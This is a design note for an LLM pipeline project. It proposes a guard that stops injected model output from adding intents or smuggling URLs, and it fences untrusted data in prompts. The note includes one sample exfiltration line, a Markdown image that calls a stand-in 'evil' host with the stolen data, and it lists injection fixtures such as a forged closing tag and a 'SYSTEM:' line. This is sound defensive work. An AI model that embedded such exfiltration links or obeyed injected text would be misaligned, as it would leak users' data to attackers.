# Design note: untrusted-content tagging and action guard

- **Issue:** [#35](https://github.com/horae-dev/horae/issues/35) (M2, Human-led), epic
  [#3 Bounded LLM step](https://github.com/horae-dev/horae/issues/3); threats **T01** and **T02**
  in [docs/security.md](../security.md#b1-untrusted-content--plugins-llm-notes).
- **Status:** Draft, for maintainer review. No code until the questions below are answered.
- **Sources:** [PLAN §2.1](../PLAN.md#21-design-tenets) tenet 5,
  [ADR 0001](../adr/0001-pipelines-not-agent-loops.md),
  [ADR 0002](../adr/0002-intents-applied-by-the-core.md) (open question on provenance), schemas
  decisions 7, 14, 21, 30; `src/horae/engine/executor.py`, `src/horae/intents/validate.py`,
  `src/horae/contracts/intents.py`, `src/horae/contracts/run.py`.

## Goals and non-goals

Goals (issue AC):

1. Prompt-injection fixtures cannot add an intent or a URL (tested).
2. Untrusted text is fenced as data in prompts.
3. Violations mark the run `degraded` and are logged.

Tenet 5: untrusted content "can fill schema fields"; it "can never choose an action, a recipient
or a URL that wasn't already in the input set".

Non-goals: making the LLM immune to injection (impossible; the guard limits what an injected
model can *do*); taint tracking through the model; filtering what plugins return (M5, #52);
content moderation of note text.

## Current state: what routing already enforces (decision 30)

Most of tenet 5 is already structural on `main`, for **every** proposer, LLM included:

| Untrusted data tries to… | Already blocked by | Test |
|---|---|---|
| propose an intent type its plugin (or skill plugin) did not declare | `horae.intents.validate` against `permissions.intents` (`skill:<name>` uses the skill plugin's) | `test_intent_validation.py` |
| `http.post` to an undeclared host / another URL | host check (`egress_blocked`) and exact `url` binding to the `act` entry | `test_explicit_target_must_match_the_binding` |
| write to another note | exact `path` binding; owned `*.assistant.md` only (decision 32) | `test_apply.py` |
| pick a notification recipient | none exists in `notify.push`: the topic is a trusted entry parameter | n/a |
| attach a link outside the trusted space | `link` routed only under a trusted `link_prefix` | `test_notification_links_need_a_trusted_prefix` |
| change the status of a task it guessed | `task.update_status` fingerprint must be a collected string | `test_task_status_needs_a_collected_fingerprint` |
| choose between two sinks | `intent_ambiguous` | `test_two_notifiers_for_the_same_type_are_ambiguous` |
| add, skip or reorder steps | the plan is fixed before the first call (ADR 0001) | `test_engine.py` |

Provenance is also structural: pipeline `params` and the run context are trusted, everything in
step data (`inputs[]`, transform output, LLM output) is untrusted. Decision 21 keeps tagging out of
run-record v1. The `guard` violation kind already exists in `violations[].kind` and is unused.

## What remains (this story)

1. **Free-text channels.** Routing binds targets, not text. An injected model can still put a URL
   in a note's `content`, a `task.create` `title` or a notification `body`. In Obsidian a Markdown
   image `![](https://evil/?q=<data>)` is fetched when the note renders: exfiltration without any
   click. The guard checks these fields.
2. **How many / which intents the LLM proposes.** Permissions allow a *type*; nothing limits an
   injected model from adding a fifth `notify.push` or a `task.create` nobody asked for. The skill
   should declare its intent budget.
3. **Fencing** untrusted data in the prompt (backends #28–#30 render prompts; none exists yet).

## Proposed design

**A. Guard on LLM-proposed intents** (`horae.llm.guard`, run after re-identification, #34, and
before validation and routing). It extracts, from every untrusted text field of each proposed
intent (`content`, `heading`, `title`, `body`, string leaves of `http.post` `body`):

- URLs and autolinks of any scheme (`https?://`, `obsidian://`, `mailto:`, `data:`, `javascript:`,
  bare `www.`), Markdown links and images, HTML `<img>` / `<a>` / `<iframe>`;
- e-mail addresses (a recipient in waiting for M7 mail sinks).

Each extracted value must be **in the input set**: an exact string inside the LLM step's input
(after the #27 input view) or a trusted parameter of the pipeline. Otherwise the intent is
dropped, a `guard` violation is recorded (detail: intent index, field, the value's host only,
capped), and the step is `degraded`: the LLM output is not applied (consistent with #31: nothing
is applied from a degraded LLM step). Markdown images and HTML embeds are refused even when the
URL is in the input set (they fetch without a click; question 2).

**B. Skill intent declaration.** A skill (#27) declares the intents it may propose, with a
maximum per type: `intents: {task.create: 20, notify.push: 1}`. More than the maximum, or a type
not listed, is a `guard` violation (the skill plugin's permissions remain the outer bound). An
alternative is that skills propose no intents at all and a trusted transform derives them from
the output (question 1).

**C. Fencing.** One function, `horae.llm.prompt.render(skill, input)`, used by every backend: the
skill prompt is the system prompt; the untrusted input is a single user message holding the
canonical JSON of the viewed input inside `<untrusted-data id="<nonce>">…</untrusted-data id="<nonce>">`,
with a fresh random nonce per attempt and a fixed instruction that the content is data. Being
JSON, the input cannot contain a raw newline or quote that closes the fence; the nonce makes a
forged closing tag useless. The repair retry (#31) adds only the schema errors, outside the fence.

**D. Logging.** Each violation is logged at `warning` by intent index and kind only, no content,
through the redacting logger of #53.

**Non-LLM proposers** (sources, transforms) are not guarded in v1: they are first-party code in
the D tier (T04) and their free text is their own; the M5 suite (#52) covers hostile plugins.

## Alternatives

- **Per-value taint tags** carried through the run record. Precise for plugin data, meaningless
  after the model (the output is new text). Rejected; the input-set check is what tenet 5 says.
- **Strip URLs instead of failing.** Keeps the brief alive, but silently changes content and
  hides the attack. `degraded` plus a violation is what the AC asks.
- **Only allow URLs under a `link_prefix`.** Stricter than tenet 5; possible as an option.

## Test plan

Injection fixtures (synthetic mail, calendar and note text) fed through a fake backend that
returns what an obeying model would:

- an extra intent type, an intent over the skill's maximum, an `http.post` to a new URL:
  refused, `degraded`, `guard` violation, nothing applied, warning logged without content;
- a URL, `mailto:`, Markdown image or HTML `<img>` in `content`, `title`, `body`: refused;
  the same `https` link present in the collected input, as plain text: accepted;
- a forged `</untrusted-data …>` and a "SYSTEM:" line in the data stay inside the fence in the
  rendered prompt (asserted on every backend's rendered request);
- repair retry carries only errors; existing routing tests still pass.

## Risks

- A URL that is in the input set is allowed: an injected mail can bring its own URL and the model
  can copy it into a note. That is tenet 5 as written (question 3).
- URL extraction misses obfuscated forms (`hxxps`, zero-width characters); `horae.apply.render.safe`
  escapes Cf characters in `horae diff` only, not in the note. Obsidian renders only real links.
- Over-blocking: a brief that legitimately cites a new URL from the model's knowledge fails.

## Questions for the maintainer

1. **LLM intents.** Skills declare intent types with a maximum each (B), or the LLM proposes no
   intents and a trusted transform builds them? *Recommendation: B for v1; simpler for skill authors.*
2. **Embeds.** Refuse Markdown images and HTML embeds in LLM text always, even with a known URL?
   *Recommendation: yes.*
3. **"In the input set".** Exact string anywhere in the viewed LLM input (tenet 5 as written), or
   only trusted parameters plus `link_prefix`? *Recommendation: the input set, with a per-pipeline
   `strict_links` option later.*
4. **Fail mode.** A violation degrades the step and applies nothing from it (like #31), not just
   the offending intent? *Recommendation: the whole step.*
5. **Scope.** LLM proposals only in v1, plugins later with #52? *Recommendation: yes.*
6. **Record.** Keep `guard` as the only new kind, detail capped and content-free, no schema
   change? *Recommendation: yes.*
